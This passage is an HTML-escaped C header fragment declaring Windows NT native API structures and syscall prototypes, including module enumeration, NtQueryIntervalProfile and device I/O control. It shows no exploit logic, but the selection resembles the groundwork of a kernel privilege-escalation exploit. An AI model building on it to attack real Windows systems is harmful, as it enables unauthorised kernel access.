ULONG Information;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x08 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IO_STATUS_BLOCK,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *PIO_STATUS_BLOCK,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;**PPIO_STATUS_BLOCK;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;enum&lt;/span&gt; _SYSTEM_INFORMATION_CLASS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemBasicInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemProcessorInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemPerformanceInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemTimeOfDayInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented1,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemProcessesAndThreadsInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemCallCounts,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemConfigurationInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemProcessorTimes,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemGlobalFlag,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented2,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemModuleInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemLockInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented3,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented4,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented5,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemHandleInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemObjectInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemPagefileInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemInstructionEmulationCounts,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemInvalidInfoClass1,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemCacheInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemPoolTagInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemProcessorStatistics,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemDpcInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented6,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemLoadImage,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemUnloadImage,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemTimeAdjustment,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented7,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented8,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented9,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemCrashDumpInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemExceptionInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemCrashDumpStateInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemKernelDebuggerInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemContextSwitchInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemRegistryQuotaInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemLoadAndCallImage,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemPrioritySeparation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented10,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemNotImplemented11,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemInvalidInfoClass2,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemInvalidInfoClass3,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemTimeZoneInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemLookasideInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemSetTimeSlipEvent,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemCreateSession,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemDeleteSession,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemInvalidInfoClass4,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemRangeStartInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemVerifierInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemAddVerifier,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SystemSessionProcessesInformation&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; SYSTEM_INFORMATION_CLASS;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; _SYSTEM_MODULE_INFORMATION&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x0000 */&lt;/span&gt; ULONG Reserved[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x0008 */&lt;/span&gt; PVOID Base;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x000C */&lt;/span&gt; ULONG Size;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x0010 */&lt;/span&gt; ULONG Flags;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x0014 */&lt;/span&gt; USHORT Index;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x0016 */&lt;/span&gt; USHORT Unknown;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x0018 */&lt;/span&gt; USHORT LoadCount;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x001A */&lt;/span&gt; USHORT ModuleNameOffset;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x001C */&lt;/span&gt; UCHAR ImageName[&lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x011C */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SYSTEM_MODULE_INFORMATION,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *PSYSTEM_MODULE_INFORMATION,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;**PPSYSTEM_MODULE_INFORMATION;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; _SYSTEM_MODULE_INFORMATION_EX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x00 */&lt;/span&gt; ULONG ModulesCount;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x04 */&lt;/span&gt; SYSTEM_MODULE_INFORMATION Modules[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0xXX */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SYSTEM_MODULE_INFORMATION_EX,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *PSYSTEM_MODULE_INFORMATION_EX,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;**PPSYSTEM_MODULE_INFORMATION_EX;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;enum&lt;/span&gt; _KPROFILE_SOURCE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileTime,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileAlignmentFixup,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileTotalIssues,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfilePipelineDry,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileLoadInstructions,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfilePipelineFrozen,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileBranchInstructions,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileTotalNonissues,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileDcacheMisses,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileIcacheMisses,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileCacheMisses,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileBranchMispredictions,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileStoreInstructions,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileFpInstructions,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileIntegerInstructions,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Profile2Issue,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Profile3Issue,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Profile4Issue,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileSpecialInstructions,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileTotalCycles,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileIcacheIssues,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileDcacheAccesses,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileMemoryBarrierCycles,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileLoadLinkedIssues,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ProfileMaximum&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; KPROFILE_SOURCE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;VOID&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(NTAPI *PIO_APC_ROUTINE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PVOID ApcContext,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PIO_STATUS_BLOCK IoStatusBlock,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG Reserved&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_VOID &lt;span class=&quot;title&quot;&gt;RtlInitAnsiString&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN OUT PANSI_STRING  DestinationString,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PUCHAR SourceString&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_VOID &lt;span class=&quot;title&quot;&gt;RtlInitUnicodeString&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN OUT PUNICODE_STRING DestinationString,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PCWSTR SourceString&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_VOID &lt;span class=&quot;title&quot;&gt;RtlCreateUnicodeStringFromAsciiz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PUNICODE_STRING DestinationString,  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PUCHAR SourceString &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_VOID &lt;span class=&quot;title&quot;&gt;RtlFreeUnicodeString&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PUNICODE_STRING UnicodeString&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_VOID &lt;span class=&quot;title&quot;&gt;RtlFreeAnsiString&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PANSI_STRING AnsiString&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;LdrLoadDll&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PWSTR DllPath OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PULONG DllCharacteristics OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PUNICODE_STRING DllName,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PVOID *DllHandle&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;LdrUnloadDll&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PVOID DllHandle&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;LdrGetProcedureAddress&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PVOID DllHandle,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PANSI_STRING ProcedureName OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG ProcedureNumber OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PVOID *ProcedureAddress&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;NtAllocateVirtualMemory&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN HANDLE ProcessHandle,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN OUT PVOID *BaseAddress,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG ZeroBits,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN OUT PULONG AllocationSize,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG AllocationType,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG Protect&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;NtFreeVirtualMemory&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN HANDLE ProcessHandle,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN OUT PVOID *BaseAddress,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN OUT PULONG FreeSize,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG FreeType&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;NtQuerySystemInformation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PVOID SystemInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG SystemInformationLength,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PULONG ReturnLength OPTIONAL&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;NtCreateFile&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PHANDLE FileHandle,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ACCESS_MASK DesiredAccess,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN POBJECT_ATTRIBUTES ObjectAttributes,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PIO_STATUS_BLOCK IoStatusBlock,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PLARGE_INTEGER AllocationSize OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG FileAttributes,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG ShareAccess,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG CreateDisposition,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG CreateOptions,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PVOID EaBuffer OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG EaLength&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;NtDeviceIoControlFile&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN HANDLE FileHandle,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN HANDLE Event OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PVOID ApcContext OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PIO_STATUS_BLOCK IoStatusBlock,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG IoControlCode,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PVOID InputBuffer OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG InputBufferLength,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PVOID OutputBuffer OPTIONAL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG OutputBufferLength&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;NtDelayExecution&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN BOOLEAN Alertable,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PLARGE_INTEGER Interval&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;NtQueryIntervalProfile&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN KPROFILE_SOURCE Source,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OUT PULONG Interval&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;IMP_SYSCALL &lt;span class=&quot;title&quot;&gt;NtClose&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span 